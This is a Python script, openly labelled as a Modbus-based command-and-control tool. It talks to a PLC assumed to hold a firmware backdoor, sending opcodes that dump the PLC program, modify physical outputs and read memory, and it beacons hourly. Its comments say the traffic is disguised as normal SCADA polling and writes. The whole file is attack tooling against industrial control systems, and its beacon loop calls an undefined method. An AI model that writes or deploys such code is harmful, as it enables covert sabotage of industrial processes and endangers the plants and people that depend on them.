# modbus_native_c2.py - C2 using Modbus protocol
from pymodbus.client import ModbusTcpClient
import struct
import time

class ModbusC2:
    def __init__(self, plc_ip, command_register=1000, response_register=1100):
        self.client = ModbusTcpClient(plc_ip, port=502)
        self.client.connect()
        self.cmd_reg = command_register
        self.resp_reg = response_register

    def send_command(self, opcode, params=[]):
        """
        Send command via Modbus registers
        Appears as normal SCADA write operations
        """
        # Write opcode
        self.client.write_register(self.cmd_reg, opcode)

        # Write parameters
        for i, param in enumerate(params):
            self.client.write_register(self.cmd_reg + 1 + i, param)

        print(f"[+] Command {opcode} sent via Modbus")

    def read_response(self, length=10):
        """
        Read response from PLC
        PLC firmware backdoor writes results to response registers
        """
        result = self.client.read_holding_registers(self.resp_reg, length)

        if not result.isError():
            return result.registers

        return None

    def execute_plc_command(self, command):
        """
        High-level command execution
        """
        commands = {
            'dump_program': (0x01, []),
            'modify_output': (0x02, [command.get('output_id', 0), command.get('state', 0)]),
            'read_memory': (0x03, [command.get('address', 0), command.get('length', 10)]),
            'backdoor_status': (0xFF, [])
        }

        if command['type'] in commands:
            opcode, params = commands[command['type']]
            self.send_command(opcode, params)

            time.sleep(2)  # Wait for PLC to process

            response = self.read_response()
            return response

    def beacon_loop(self, interval=3600):
        """
        Periodic beacon to check for new commands
        Blends with normal SCADA polling
        """
        while True:
            # Check for pending commands (opcode 0xFF = status check)
            self.send_command(0xFF, [])

            response = self.read_response(1)
            if response and response[0] > 0:
                # New command available
                print("[+] New command detected")
                # Read and execute command
                cmd_data = self.read_response(10)
                self.process_command(cmd_data)

            time.sleep(interval)  # Slow beacon (every hour)

# Usage
modbus_c2 = ModbusC2("192.168.10.10")
modbus_c2.execute_plc_command({'type': 'dump_program'})
modbus_c2.beacon_loop(3600)
